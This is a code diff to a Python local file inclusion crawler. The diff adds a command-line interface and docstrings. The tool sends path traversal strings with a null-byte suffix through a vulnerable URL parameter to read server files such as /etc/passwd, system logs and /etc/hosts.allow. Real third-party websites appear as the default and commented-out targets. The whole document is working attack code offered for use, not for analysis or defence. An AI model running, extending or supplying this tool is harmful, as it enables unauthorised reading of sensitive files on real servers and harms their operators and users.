@@ -136,25 +136,41 @@ default_lfi_files = [
 "/var/adm/X0msgs",
 "/var/adm/crash/vmcore",
 "/var/adm/crash/unix",
+#other
+"/etc/hosts.allow",
 ];
 
 
 #ttp://www.sofora.ru/landdesign_uslugi_melichimles_polezno.html?id=../../../../../../etc/passwd%00 
 default_path = "../../../../../..";
-default_site = "http://www.sofora.ru/landdesign_uslugi_melichimles_polezno.html?";
-default_vuln_param = "id=";
+default_site = "http://www.sofora.ru/landdesign_uslugi_melichimles_polezno.html";
+default_vuln_param = "id";
 default_post = "%00";
 
 #without headers and user agent now
 class lfi_crawler():
+    """lfi_crawler try to find file locations at server
+    by sending paths in vulnerable URL parameter
+    WARNING: script not finds vulnerable parameters,
+    you must do it with some other tools (acunetix for example)"""
     def __init__(self,
             site = default_site,
             vuln_param = default_vuln_param,
             path = default_path,
             lfi_files = default_lfi_files, 
             post = default_post):
+        """ site url to vulnerable site
+        vuln_param - name of exploitable parameter
+        path - path to root
+        lfi_files - list of strings, contains absolute paths to logs
+        For example acunetix find lfi vulnerability at
+        http://example.com/index.php?id=../../../etc/passwd
+        path is ../../..
+        vuln param is id=
+        FIXME:WRITEME
+        """
 
-        self.urlstart = site + vuln_param + path
+        self.urlstart = site + "?" + vuln_param + "=" + path
         self.lfi_dict = lfi_files
         self.urlstop = post;
         self.index = 0;
@@ -168,6 +184,7 @@ class lfi_crawler():
     def __iter__(self):
         return self
     def next(self):
+        """check next file location"""
         if self.index >= len(self.lfi_dict):
             raise StopIteration;
         if self.index > 0:
@@ -190,9 +207,9 @@ class lfi_crawler():
 
         self.index += 1;
     def find_lfi(self, page):
-        #simple check len of cur page and if it more than clean page print to stdout
-        #FIXME! just stupid check
-        #magic value 42 ^___^
+        """simple check len of cur page and if it more than clean page print to stdout
+        FIXME! just stupid check
+        magic value 42 ^___^"""
         if len(page) <= len(self.clean_page) + 42:
             return None
         cplines = self.clean_page.split('\n')
@@ -207,6 +224,7 @@ class lfi_crawler():
         return  "\n".join(plines[start:stop])
        
     def set_idle(self, seconds):
+        """set idle time between http requests (default 0)"""
         if seconds > 0.:
             self.idle_time = seconds
     def idle(self):
@@ -215,10 +233,36 @@ class lfi_crawler():
         else:
             time.sleep(self.idle_time);
 #rewrite me
+def main():
+    from optparse import OptionParser
+    parser = OptionParser()
+    parser.add_option("-u", "--url", action="store",
+                      type="string", dest="url",
+                      help="url path")
+    parser.add_option("-r", "--rootpath", action="store", 
+                      type="string", dest="rootpath", default="../../",
+                      help="relative path to root of fs from script on server")
+    parser.add_option("-p", "--param", action="store", default="id",
+                      type="string", dest="param",
+                      help="vulnerable parameter")
+    parser.add_option("-e", "--ending", action="store",
+                      type="string", dest="ending", default="",
+                      help="optional url ending\n"
+                      "may be need for poison null (%00)")
 
-crawler = lfi_crawler();
-#crawler = lfi_crawler("http://povstanets.kiev.ua/index.php?", "do=", "../../../../../..");
-#crawler.set_idle(0.5);
+    (options, args) = parser.parse_args()
+    print options, args
+    if options.url is None:
+        parser.print_help()
+        return
+    crawler = lfi_crawler(options.url, options.param, options.rootpath,
+                          post=options.ending);
+    #crawler = lfi_crawler("http://povstanets.kiev.ua/index.php", "do=", "../../../../../..");
+    #crawler.set_idle(0.5);
 
-for i in crawler:
-    pass;
+    for i in crawler:
+        pass;
+
+if __name__ == "__main__":
+    main()
+
